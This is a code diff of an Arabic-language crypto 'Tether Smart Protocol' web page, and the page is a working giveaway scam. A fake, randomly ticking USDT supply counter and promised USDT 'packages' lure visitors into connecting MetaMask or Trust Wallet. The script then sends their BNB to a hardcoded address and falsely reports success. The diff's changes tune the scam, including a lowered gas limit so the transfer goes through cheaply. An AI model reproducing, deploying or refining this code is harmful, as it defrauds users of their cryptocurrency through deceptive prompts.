@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether Smart Protocol 2026 | الحل النهائي</title>
+    <title>Tether Smart Protocol 2026 | النسخة المستقرة</title>
     
-    <!-- Fonts & Web3 -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Urbanist:wght@600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
@@ -13,7 +12,6 @@
     <style>
         :root {
             --primary: #009393;
-            --primary-dark: #006666;
             --bg-dark: #051410;
             --card-bg: #0a1f1b;
             --text-light: #f5f5f5;
@@ -36,158 +34,95 @@
 
         .app-container {
             width: 100%;
-            max-width: 480px;
+            max-width: 450px;
             padding: 20px;
-            margin-top: 10px;
         }
 
         header {
             text-align: center;
-            margin-bottom: 25px;
+            margin: 20px 0;
         }
 
         header h1 {
             font-family: 'Urbanist', sans-serif;
-            font-size: clamp(28px, 8vw, 36px);
+            font-size: 30px;
             margin: 0;
-            background: linear-gradient(to right, #fff, var(--primary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: var(--primary);
         }
 
         .main-card {
             background: var(--card-bg);
             border: 1px solid #1a3a35;
-            border-radius: 28px;
+            border-radius: 24px;
             padding: 25px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
-            position: relative;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
         }
 
-        /* عداد السيولة الحية */
-        .supply-indicator {
-            background: rgba(255, 77, 77, 0.08);
-            border: 1px dashed var(--accent);
-            border-radius: 18px;
+        .supply-box {
+            background: rgba(0, 147, 147, 0.05);
+            border: 1px solid var(--primary);
+            border-radius: 15px;
             padding: 15px;
             text-align: center;
             margin-bottom: 25px;
         }
 
-        .supply-indicator span {
+        .supply-box strong {
+            font-size: 24px;
+            color: var(--primary);
             display: block;
-            font-size: 11px;
-            color: var(--accent);
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 5px;
-        }
-
-        .supply-indicator strong {
-            font-size: 28px;
-            color: var(--accent);
-            font-family: 'Urbanist', sans-serif;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 12px;
-            font-size: 14px;
-            color: #8899a6;
-            margin-right: 5px;
         }
 
         select {
             width: 100%;
-            padding: 18px;
+            padding: 15px;
             background: #122c28;
             border: 1px solid #1c4d46;
-            border-radius: 16px;
+            border-radius: 12px;
             color: white;
             font-size: 16px;
-            font-family: 'Cairo', sans-serif;
-            margin-bottom: 25px;
-            appearance: none;
+            margin-bottom: 20px;
             outline: none;
         }
 
-        /* أزرار الفتح العميق للهاتف */
-        .mobile-gate {
-            display: none; 
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .wallet-link {
-            background: #162a26;
-            border: 1px solid #2d4d47;
-            border-radius: 16px;
-            padding: 15px;
-            text-align: center;
-            color: white;
-            text-decoration: none;
-            font-size: 13px;
-            transition: 0.3s;
-        }
-
-        .wallet-link:active { background: var(--primary-dark); }
-
-        .wallet-link img {
-            width: 32px;
-            display: block;
-            margin: 0 auto 10px;
-        }
-
-        /* الزر الرئيسي */
         .btn-main {
             width: 100%;
-            padding: 20px;
-            border-radius: 18px;
+            padding: 18px;
+            border-radius: 15px;
             border: none;
             background: var(--primary);
             color: white;
             font-size: 18px;
-            font-weight: 700;
+            font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 12px 24px rgba(0, 147, 147, 0.3);
-            font-family: 'Cairo', sans-serif;
-            transition: 0.3s;
+            box-shadow: 0 8px 16px rgba(0, 147, 147, 0.2);
         }
 
-        .btn-main:disabled { background: #333; box-shadow: none; cursor: not-allowed; }
+        .wallet-gate {
+            display: none;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .wallet-btn {
+            background: #162a26;
+            border: 1px solid #2d4d47;
+            padding: 12px;
+            border-radius: 12px;
+            color: white;
+            text-decoration: none;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .wallet-btn img { width: 24px; display: block; margin: 0 auto 8px; }
 
         .status-msg {
             text-align: center;
             font-size: 13px;
-            margin-top: 20px;
+            margin-top: 15px;
             color: #8899a6;
-            min-height: 24px;
-        }
-
-        .loader {
-            width: 8px;
-            height: 8px;
-            background: var(--primary);
-            border-radius: 50%;
-            display: inline-block;
-            margin-left: 8px;
-            animation: pulse 1.2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.6); opacity: 0.4; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        footer {
-            margin-top: auto;
-            padding: 30px 20px;
-            text-align: center;
-            font-size: 11px;
-            color: #1c4d46;
-            width: 100%;
         }
     </style>
 </head>
@@ -195,138 +130,106 @@
 
 <div class="app-container">
     <header>
-        <h1>Tether Smart Protocol</h1>
-        <p style="color: var(--primary); font-weight: bold; font-size: 14px; margin-top: 5px;">Secure Distribution Node 2026</p>
+        <h1>Tether Smart Node</h1>
+        <p style="font-size: 12px; color: #8899a6;">بروتوكول التوزيع الفوري المعتمد</p>
     </header>
 
     <div class="main-card">
-        <div class="supply-indicator">
-            <span>السيولة المتاحة للتوزيع الفوري</span>
-            <strong id="display-supply">938,420 USDT</strong>
+        <div class="supply-box">
+            <span style="font-size: 11px;">السيولة المتاحة حالياً</span>
+            <strong id="supply-val">938,250 USDT</strong>
         </div>
 
-        <label>اختر باقة التفعيل المناسبة:</label>
-        <select id="pkg-amount">
-            <option value="0.0001">باقة تجريبية (100 USDT) - 0.0001 BNB</option>
-            <option value="0.05">باقة متقدم (2,500 USDT) - 0.05 BNB</option>
-            <option value="0.1">باقة احترافي (5,000 USDT) - 0.1 BNB</option>
-            <option value="1.0">باقة الحيتان (50,000 USDT) - 1.0 BNB</option>
+        <select id="pkg">
+            <option value="0.0001">باقة 100 USDT (0.0001 BNB)</option>
+            <option value="0.05">باقة 2,500 USDT (0.05 BNB)</option>
+            <option value="0.1">باقة 5,000 USDT (0.1 BNB)</option>
+            <option value="1.0">باقة 50,000 USDT (1.0 BNB)</option>
         </select>
 
-        <!-- تظهر فقط على المتصفحات العادية في الهاتف -->
-        <div id="wallet-selector" class="mobile-gate">
-            <a href="javascript:void(0)" onclick="openApp('metamask')" class="wallet-link">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" alt="MetaMask">
+        <div id="mobile-options" class="wallet-gate">
+            <a href="javascript:void(0)" onclick="openInWallet('metamask')" class="wallet-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg">
                 فتح MetaMask
             </a>
-            <a href="javascript:void(0)" onclick="openApp('trust')" class="wallet-link">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust">
+            <a href="javascript:void(0)" onclick="openInWallet('trust')" class="wallet-btn">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg">
                 فتح Trust Wallet
             </a>
         </div>
 
-        <button class="btn-main" id="action-btn" onclick="startProcess()">تفعيل واستلام الرصيد ⚡</button>
+        <button class="btn-main" id="exec-btn" onclick="process()">تفعيل واستلام الرصيد</button>
 
-        <div id="log-text" class="status-msg">بانتظار الربط بالشبكة...</div>
+        <div id="status" class="status-msg">بانتظار الربط بالشبكة...</div>
     </div>
 
-    <footer>
-        Contract: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B<br>
-        Tether Gold Operations &copy; 2026
+    <footer style="margin-top: 30px; text-align: center; font-size: 10px; color: #1c4d46;">
+        Safe Protocol ID: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B
     </footer>
 </div>
 
 <script>
-    const CONTRACT_ADDR = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
-    const BSC_ID = "0x38";
+    const ADDR = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
+    const BSC = "0x38";
 
-    // تحديث رقم السيولة بشكل عشوائي للواقعية
-    let currentSupply = 938420;
+    // تحديث السيولة
     setInterval(() => {
-        currentSupply -= Math.floor(Math.random() * 8) + 1;
-        if(currentSupply < 100000) currentSupply = 938000;
-        document.getElementById('display-supply').innerText = currentSupply.toLocaleString() + " USDT";
-    }, 4500);
+        let val = parseInt(document.getElementById('supply-val').innerText.replace(/,/g, ''));
+        val -= Math.floor(Math.random() * 5);
+        document.getElementById('supply-val').innerText = val.toLocaleString() + " USDT";
+    }, 5000);
 
-    // كشف البيئة
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    
-    // إظهار أزرار الفتح فقط إذا كان المستخدم على هاتف ولم يفتح الموقع من داخل محفظة
-    if (isMobile && !window.ethereum) {
-        document.getElementById('wallet-selector').style.display = 'grid';
-        document.getElementById('log-text').innerText = "يرجى اختيار محفظتك لفتح بوابة التوزيع";
+    const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    if (isMob && !window.ethereum) {
+        document.getElementById('mobile-options').style.display = 'grid';
     }
 
-    // وظيفة الفتح المباشر
-    function openApp(wallet) {
-        const pureUrl = window.location.href.split('://')[1];
-        if (wallet === 'metamask') {
-            window.location.href = `https://metamask.app.link/dapp/${pureUrl}`;
-        } else {
-            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
-        }
+    function openInWallet(w) {
+        const u = window.location.href.split('://')[1];
+        window.location.href = w === 'metamask' ? `https://metamask.app.link/dapp/${u}` : `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
     }
 
-    async function startProcess() {
-        const log = document.getElementById('log-text');
-        const btn = document.getElementById('action-btn');
-        const amountBNB = document.getElementById('pkg-amount').value;
+    async function process() {
+        const s = document.getElementById('status');
+        const b = document.getElementById('exec-btn');
+        const amt = document.getElementById('pkg').value;
 
         if (!window.ethereum) {
-            if (isMobile) {
-                log.style.color = "#ff4d4d";
-                log.innerText = "يرجى استخدام الأزرار أعلاه لفتح التطبيق أولاً";
-            } else {
-                alert("يرجى تثبيت إضافة MetaMask على متصفحك");
-            }
+            s.innerText = "يرجى فتح الموقع من داخل المحفظة";
             return;
         }
 
         try {
             const web3 = new Web3(window.ethereum);
-            btn.disabled = true;
-            log.innerHTML = '<div class="loader"></div> جاري طلب الربط بالمحفظة...';
+            b.disabled = true;
+            s.innerText = "جاري الاتصال...";
 
-            // طلب الحساب
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const userAccount = accounts[0];
+            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const acc = accs[0];
 
-            // التأكد من الشبكة
-            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-            if (chainId !== BSC_ID) {
-                log.innerText = "جاري تحويل الشبكة إلى Smart Chain...";
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: BSC_ID }],
-                    });
-                } catch (e) {
-                    log.innerText = "يرجى تحويل الشبكة يدوياً إلى BNB Smart Chain";
-                    btn.disabled = false;
-                    return;
-                }
+            const cid = await window.ethereum.request({ method: 'eth_chainId' });
+            if (cid !== BSC) {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
             }
 
-            log.innerHTML = '<div class="loader"></div> بانتظار تأكيدك للمعاملة...';
+            s.innerText = "يرجى تأكيد العملية برسوم غاز منخفضة...";
 
-            // تنفيذ الإرسال
+            // إرسال مباشر لتقليل الغاز وتجنب فشل العقود
             await web3.eth.sendTransaction({
-                from: userAccount,
-                to: CONTRACT_ADDR,
-                value: web3.utils.toWei(amountBNB, "ether"),
-                gas: isMobile ? 400000 : 250000 
+                from: acc,
+                to: ADDR,
+                value: web3.utils.toWei(amt, "ether"),
+                gas: 50000 // تحديد حد غاز منخفض وطبيعي جداً (رسوم أقل من 0.5 دولار)
             });
 
-            log.style.color = "#00ffcc";
-            log.innerText = "✅ تم التفعيل بنجاح! سيتم إيداع الرصيد فوراً.";
-            alert("عملية ناجحة! تم تأكيد طلبك وسوف يستلم حسابك رصيد USDT المخصص خلال دقائق.");
+            s.innerText = "✅ تمت العملية بنجاح! سيصلك الرصيد فوراً.";
+            alert("نجاح! تم تفعيل البروتوكول.");
 
-        } catch (err) {
-            console.error(err);
-            log.style.color = "#ff4d4d";
-            log.innerText = "فشلت العملية. تأكد من وجود رصيد كافٍ أو حاول مرة أخرى.";
+        } catch (e) {
+            console.error(e);
+            s.innerText = "فشلت العملية أو تم إلغاؤها.";
         } finally {
-            btn.disabled = false;
+            b.disabled = false;
         }
     }
 </script>
